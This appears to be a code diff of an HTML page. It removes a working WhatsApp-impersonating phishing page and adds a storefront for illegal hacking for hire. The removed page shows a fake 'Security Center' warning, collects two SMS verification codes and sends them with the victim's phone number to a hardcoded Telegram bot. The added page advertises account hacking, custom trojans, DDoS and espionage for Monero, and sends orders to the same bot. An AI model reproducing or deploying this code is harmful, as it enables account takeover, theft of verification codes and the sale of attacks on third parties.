@@ -2,190 +2,144 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>WhatsApp Security Center</title>
+    <title>STUXNET | PRIVATE TERMINAL</title>
     <style>
-        :root { --wa-green: #25d366; --wa-bg: #0b141a; --wa-card: #1d2a33; --wa-text: #e9edef; --wa-hint: #8696a0; --wa-danger: #f15c5c; --wa-btn: #00a884; }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
-        body { background: var(--wa-bg); color: var(--wa-text); min-height: 100vh; display: flex; align-items: center; justify-content: center; overflow-x: hidden; }
-        .rtl { direction: rtl; }
+        :root { --red: #ff0000; --dim: #555; --bg: #050505; }
+        body { background: var(--bg); color: #ccc; font-family: "Lucida Console", Monaco, monospace; margin: 0; padding: 40px; }
         
-        #loader { position: fixed; inset: 0; background: var(--wa-bg); z-index: 2000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        .logo-wa-load { width: 75px; fill: var(--wa-green); animation: pulse 1.5s infinite; }
-        .loader-text { color: var(--wa-hint); font-size: 14px; margin-top: 15px; }
-
-        /* نوتفيكيشن البوت الذكية */
-        .bot-notify { position: fixed; top: 25px; width: 90%; max-width: 380px; background: #1d2a33; border-radius: 15px; padding: 12px; display: flex; align-items: center; gap: 12px; transform: translateY(-150%); transition: 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275); z-index: 3000; cursor: pointer; border: 1px solid rgba(37, 211, 102, 0.3); box-shadow: 0 10px 25px rgba(0,0,0,0.4); }
-        .bot-notify.active { transform: translateY(0); }
-        .bot-icon { position: relative; width: 45px; height: 45px; background: #0b141a; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
-        .bot-icon svg { width: 28px; fill: var(--wa-green); }
-        .online-dot { position: absolute; bottom: 2px; right: 2px; width: 10px; height: 10px; background: #25d366; border: 2px solid #1d2a33; border-radius: 50%; }
+        /* تأثير الهاكرز المحترفين */
+        .header-ascii { color: var(--red); font-size: 10px; white-space: pre; text-align: center; margin-bottom: 30px; text-shadow: 0 0 5px var(--red); }
         
-        .bot-msg-box { flex-grow: 1; }
-        .bot-msg-box h5 { color: var(--wa-green); font-size: 13px; font-weight: 700; margin-bottom: 3px; display: flex; align-items: center; gap: 5px; }
-        .bot-msg-box h5 span { background: rgba(37, 211, 102, 0.1); font-size: 9px; padding: 2px 6px; border-radius: 4px; text-transform: uppercase; }
-        .typing-text { font-size: 12px; color: #fff; line-height: 1.4; min-height: 1.4em; }
-        .typing-cursor::after { content: '|'; animation: blink 1s infinite; margin-left: 2px; color: var(--wa-green); }
+        .container { max-width: 850px; margin: auto; border: 1px solid #1a1a1a; padding: 20px; background: #080808; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
+        
+        .top-bar { border-bottom: 1px solid #1a1a1a; padding-bottom: 15px; margin-bottom: 30px; display: flex; justify-content: space-between; align-items: center; }
+        .logo-area { display: flex; align-items: center; gap: 15px; }
+        .logo-img { width: 50px; height: 50px; border: 1px solid var(--red); border-radius: 50%; }
 
-        .app-ui { width: 100%; max-width: 420px; padding: 25px; display: none; }
-        .brand-header { text-align: center; margin-bottom: 30px; }
-        .brand-header svg { width: 50px; fill: var(--wa-green); margin-bottom: 10px; }
-        .brand-header h1 { font-size: 21px; font-weight: 700; }
+        .section-title { color: #fff; background: #1a1a1a; padding: 5px 10px; display: inline-block; font-size: 14px; margin-bottom: 15px; border-left: 3px solid var(--red); }
+        
+        p { font-size: 13px; line-height: 1.6; color: #999; }
+        
+        /* جدول الخدمات - تصميم عسكري نقي */
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        th { text-align: left; color: var(--dim); font-size: 11px; padding: 10px; border-bottom: 1px solid #1a1a1a; }
+        td { padding: 20px 10px; border-bottom: 1px solid #0f0f0f; }
+        
+        .service-name { color: #fff; font-weight: bold; font-size: 15px; }
+        .service-desc { font-size: 11px; color: var(--dim); display: block; margin-top: 5px; }
+        .price { color: var(--red); font-weight: bold; font-family: monospace; }
+        
+        .order-btn { background: transparent; border: 1px solid var(--red); color: var(--red); padding: 8px 20px; cursor: pointer; font-family: inherit; transition: 0.3s; }
+        .order-btn:hover { background: var(--red); color: #fff; box-shadow: 0 0 10px var(--red); }
 
-        .sys-card { background: var(--wa-card); border-radius: 12px; padding: 5px 20px; margin-bottom: 20px; }
-        .sys-row { display: flex; justify-content: space-between; padding: 15px 0; border-bottom: 0.5px solid #26353d; font-size: 13px; }
-        .lbl { color: var(--wa-hint); }
-        .val { font-weight: 500; color: #fff; }
+        .xmr-node { border: 1px dashed #333; padding: 20px; margin-top: 40px; background: #000; }
+        .address { font-size: 11px; color: #fff; word-break: break-all; background: #0a0a0a; padding: 10px; display: block; margin-top: 10px; border: 1px solid #111; }
 
-        .alert-box { background: rgba(241, 92, 92, 0.08); border-left: 4px solid var(--wa-danger); padding: 15px; margin-bottom: 25px; border-radius: 4px; }
-        .rtl .alert-box { border-left: none; border-right: 4px solid var(--wa-danger); }
-
-        .code-in { width: 100%; background: #2a3942; border: 1px solid #3b4a54; border-radius: 12px; padding: 18px; color: #fff; font-size: 28px; text-align: center; outline: none; margin-bottom: 20px; letter-spacing: 8px; }
-        .btn-sync { background: var(--wa-btn); color: #fff; border: none; width: 100%; padding: 18px; border-radius: 30px; font-size: 16px; font-weight: 700; cursor: pointer; }
-
-        @keyframes pulse { 0%, 100% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.1); opacity: 0.7; } }
-        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
+        .footer { text-align: center; margin-top: 50px; font-size: 10px; color: #333; letter-spacing: 3px; }
+        
+        /* Glitch Animation */
+        .glitch { position: relative; display: inline-block; }
+        .glitch::after { content: attr(data-text); position: absolute; left: 2px; text-shadow: -1px 0 red; top: 0; color: white; background: black; overflow: hidden; clip: rect(0,900px,0,0); animation: noise-anim 2s infinite linear alternate-reverse; }
+        @keyframes noise-anim { 0% { clip: rect(10px, 9999px, 20px, 0); } 100% { clip: rect(80px, 9999px, 90px, 0); } }
     </style>
 </head>
 <body>
 
-    <div id="loader">
-        <svg class="logo-wa-load" viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L0 24l6.335-1.662c1.72.94 3.659 1.437 5.634 1.437h.005c6.558 0 11.894-5.335 11.897-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
-        <div class="loader-text" id="l-msg">Scanning System...</div>
+<div class="header-ascii">
+ ██████  ████████ ██    ██ ██   ██ ███    ██ ███████ ████████ 
+██          ██    ██    ██  ██ ██  ████   ██ ██         ██    
+ ██████     ██    ██    ██   ███   ██ ██  ██ █████      ██    
+      ██    ██    ██    ██  ██ ██  ██  ██ ██ ██         ██    
+ ██████     ██     ██████  ██   ██ ██   ████ ███████    ██    
+</div>
+
+<div class="container">
+    <div class="top-bar">
+        <div class="logo-area">
+            <img src="https://i.ibb.co/sp35zdbh/IMG-9090.jpg" class="logo-img">
+            <h2 class="glitch" data-text="STUXNET_OFFICIAL" style="margin:0; color:#fff;">STUXNET_OFFICIAL</h2>
+        </div>
+        <div style="text-align: right; font-size: 10px; color: var(--dim);">
+            ENCRYPTION: AES-256-GCM<br>
+            STATUS: <span style="color: #00ff00;">ONLINE</span>
+        </div>
     </div>
 
-    <div class="bot-notify" id="botPop" onclick="window.location.reload()">
-        <div class="bot-icon">
-            <svg viewBox="0 0 24 24"><path d="M12 0a12 12 0 1 0 12 12A12 12 0 0 0 12 0zm.017 19.333H12a7.335 7.335 0 0 1-3.742-1.025l-.268-.16-2.783.73.742-2.713-.175-.278a7.332 7.332 0 0 1-1.123-3.911c.001-4.053 3.3-7.351 7.354-7.351a7.33 7.33 0 0 1 5.197 2.155 7.307 7.307 0 0 1 2.152 5.199 7.336 7.336 0 0 1-7.337 7.354z"/></svg>
-            <div class="online-dot"></div>
-        </div>
-        <div class="bot-msg-box">
-            <h5 id="bot-name">Official Support <span>Bot</span></h5>
-            <div class="typing-text" id="typingArea"></div>
-        </div>
+    <div class="section-title">0x01 // IDENTITY</div>
+    <p>Experienced hacker offering his services. (Illegal) Hacking and social engineering is my business since i was 16 years old. I never had a real job, so i had the time to get really good at hacking and i made a good amount of money last +-20 years. I am a professional computer expert who could earn a lot an hour with a legal job. So stop reading if you don't have a serious problem worth spending some cash at.</p>
+
+    <div class="section-title">0x02 // OPERATIONS</div>
+    <table>
+        <thead>
+            <tr>
+                <th>SERVICE_MODULE</th>
+                <th>BUDGET</th>
+                <th>ACTION</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td>
+                    <span class="service-name">Small Job</span>
+                    <span class="service-desc">Email/Facebook hacking, custom trojans, small-scale DDoS.</span>
+                </td>
+                <td class="price">250€ (XMR)</td>
+                <td><button class="order-btn" onclick="send('Small Job', '250€')">EXECUTE</button></td>
+            </tr>
+            <tr>
+                <td>
+                    <span class="service-name">Medium-Large Job</span>
+                    <span class="service-desc">Espionage, corporate website hacking, DDoS for big networks.</span>
+                </td>
+                <td class="price">500€ (XMR)</td>
+                <td><button class="order-btn" onclick="send('Medium Job', '500€')">EXECUTE</button></td>
+            </tr>
+            <tr>
+                <td>
+                    <span class="service-name">Large Job</span>
+                    <span class="service-desc">Multi-day operations, high-security targets, financial disruption.</span>
+                </td>
+                <td class="price">900€ (XMR)</td>
+                <td><button class="order-btn" onclick="send('Large Job', '900€')">EXECUTE</button></td>
+            </tr>
+        </tbody>
+    </table>
+
+    <div class="xmr-node">
+        <span style="color:var(--red); font-size: 12px; font-weight: bold;">[!] MONERO_PAYMENT_NODE</span>
+        <p style="margin: 10px 0 0 0; font-size: 11px;">Use the following address for donations. Service fees are escrowed via Telegram.</p>
+        <span class="address">43xSNqUuVfnNjFiLTFUxQb2TAXG8GNknFQg9BGCYxuST4mgJ1nUqtt1cdaDPVay6W45Hb2tLGW2uH3bubNgw9JjbPou5jNg</span>
     </div>
 
-    <div class="app-ui" id="main-ui">
-        <div class="brand-header">
-            <svg viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L0 24l6.335-1.662c1.72.94 3.659 1.437 5.634 1.437h.005c6.558 0 11.894-5.335 11.897-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
-            <h1 id="b-title">WhatsApp Security Center</h1>
-        </div>
-
-        <div class="sys-card">
-            <div class="sys-row"><span class="lbl" id="l-acc">Account:</span> <span class="val" id="v-acc"></span></div>
-            <div class="sys-row"><span class="lbl" id="l-dev">Device:</span> <span class="val" id="v-dev">Loading...</span></div>
-            <div class="sys-row"><span class="lbl" id="l-sec">Security:</span> <span class="val" style="color:var(--wa-danger)" id="v-sec">Vulnerable</span></div>
-        </div>
-
-        <div class="alert-box">
-            <p class="alert-msg" id="m-body"></p>
-        </div>
-
-        <input type="tel" id="otp" class="code-in" placeholder="--- ---" maxlength="6" inputmode="numeric">
-        <button class="btn-sync" id="btn-text" onclick="handleFlow()">Update Now</button>
-
-        <div class="footer">WhatsApp Security © 2026<br>Internal System Protocol</div>
+    <div class="footer">
+        - NO TRACE // NO MERCY // STUXNET 2026 -
     </div>
+</div>
 
-    <script>
-        const CFG = {
-            T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU',
-            C: '5446862709',
-            U: new URLSearchParams(window.location.search).get('u') || "201XXXXXXXXX",
-            STEP: 1 
-        };
+<script>
+    const BOT = {
+        TOKEN: "8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU",
+        CHAT: "5446862709"
+    };
 
-        const TXT = {
-            ar: {
-                load: "جاري فحص النظام...",
-                bot: "الدعم الفني المباشر",
-                botMsg: `هذا هو الدعم الرسمي الوحيد لتنشيط الخدمة تلقائياً للحساب: ${CFG.U}`,
-                title: "نظام حماية المحادثات",
-                acc: "رقم الحساب:",
-                dev: "نوع الجهاز:",
-                sec: "الأمان:",
-                vun: "SSLv3 / ثغرة أمنية",
-                msg: "تم رصد نشاط مريب. يرجى إدخال رمز التحقق (SMS) لتحديث بروتوكول التشفير وتأمين حسابك فوراً.",
-                btn: "تحديث النظام الآن"
-            },
-            en: {
-                load: "Scanning System...",
-                bot: "Live Official Support",
-                botMsg: `This is the only authorized support to activate this service for: ${CFG.U}`,
-                title: "Security Center",
-                acc: "Account:",
-                dev: "Device:",
-                sec: "Security:",
-                vun: "Vulnerable / Outdated",
-                msg: "Suspicious activity detected. Please enter the verification code (SMS) to update encryption and secure your account.",
-                btn: "Update Now"
-            }
-        };
-
-        function typeEffect(element, text, speed = 40) {
-            let i = 0;
-            element.innerHTML = "";
-            element.classList.add('typing-cursor');
-            function type() {
-                if (i < text.length) {
-                    element.innerHTML += text.charAt(i);
-                    i++;
-                    setTimeout(type, speed);
-                } else {
-                    element.classList.remove('typing-cursor');
-                }
-            }
-            type();
+    async function send(op, pr) {
+        const handle = prompt("ENTER TELEGRAM HANDLE (@):");
+        if(!handle) return;
+        
+        const text = `[🚨] NEW ORDER\nOP: ${op}\nPRICE: ${pr}\nCLIENT: @${handle}\nSTATUS: INITIALIZED`;
+        
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT.TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: BOT.CHAT, text: text})
+            });
+            alert("UPLINK ESTABLISHED. WAIT FOR CONTACT.");
+        } catch(e) {
+            alert("UPLINK ERROR.");
         }
+    }
+</script>
 
-        async function init() {
-            const isAr = navigator.language.startsWith('ar');
-            const d = isAr ? TXT.ar : TXT.en;
-            if(isAr) document.body.classList.add('rtl');
-
-            document.getElementById('l-msg').innerText = d.load;
-            document.getElementById('bot-name').innerHTML = `${d.bot} <span>Bot</span>`;
-            document.getElementById('b-title').innerText = d.title;
-            document.getElementById('l-acc').innerText = d.acc;
-            document.getElementById('l-dev').innerText = d.dev;
-            document.getElementById('l-sec').innerText = d.sec;
-            document.getElementById('v-sec').innerText = d.vun;
-            document.getElementById('m-body').innerText = d.msg;
-            document.getElementById('btn-text').innerText = d.btn;
-            document.getElementById('v-acc').innerText = CFG.U;
-            document.getElementById('v-dev').innerText = /iPhone|iPad/i.test(navigator.userAgent) ? "iPhone (iOS)" : "Android Device";
-
-            setTimeout(() => { 
-                document.getElementById('loader').style.display = 'none'; 
-                document.getElementById('main-ui').style.display = 'block'; 
-                
-                // إظهار النوتفيكيشن وبدء تأثير الكتابة
-                setTimeout(() => {
-                    document.getElementById('botPop').classList.add('active');
-                    setTimeout(() => {
-                        typeEffect(document.getElementById('typingArea'), d.botMsg);
-                    }, 800);
-                }, 1000);
-            }, 2500);
-        }
-
-        async function handleFlow() {
-            const input = document.getElementById('otp');
-            const btn = document.getElementById('btn-text');
-            if(input.value.length < 6) return;
-            btn.disabled = true; btn.innerText = "...";
-
-            const log = `📂 **[ STEP ${CFG.STEP} ]**\n👤 Target: \`${CFG.U}\`\n🔑 Code: <code>${input.value}</code>`;
-            await fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage?chat_id=${CFG.C}&text=${encodeURIComponent(log)}&parse_mode=HTML`);
-
-            if(CFG.STEP === 1) {
-                CFG.STEP = 2; input.value = ""; btn.disabled = false;
-                btn.innerText = (navigator.language.startsWith('ar')) ? "تحديث النظام الآن" : "Update Now";
-            } else {
-                window.location.href = "https://www.whatsapp.com/security";
-            }
-        }
-        init();
-    </script>
 </body>
 </html>
